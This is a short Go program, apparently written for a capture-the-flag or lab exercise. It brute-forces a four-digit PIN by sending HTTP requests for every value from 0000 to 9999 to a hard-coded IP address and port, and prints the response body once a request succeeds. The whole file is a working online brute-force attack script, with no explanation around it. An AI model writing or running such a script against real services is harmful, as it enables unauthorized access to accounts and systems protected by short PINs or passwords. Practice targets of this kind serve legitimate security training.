package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
)

const ip = "83.136.254.158"
const port = "52976"

func main() {
	for i := 0; i <= 9999; i++ {
		pin := fmt.Sprintf("%04d", i)
		url := fmt.Sprintf("http://%s:%s/pin?pin=%s", ip, port, pin)

		req, err := http.Get(url)
		if err != nil {
			log.Fatal(err)
		}

		log.Printf("pin tried: %s", pin)

		if req.StatusCode == http.StatusOK {
			log.Printf("Correct PIN found: %s", pin)
			body, err := io.ReadAll(req.Body)
			if err != nil {
				log.Fatal("Failed to read request body", http.StatusInternalServerError)
				return
			}
			fmt.Println("Request Body:", string(body))
			break
		}

	}
}
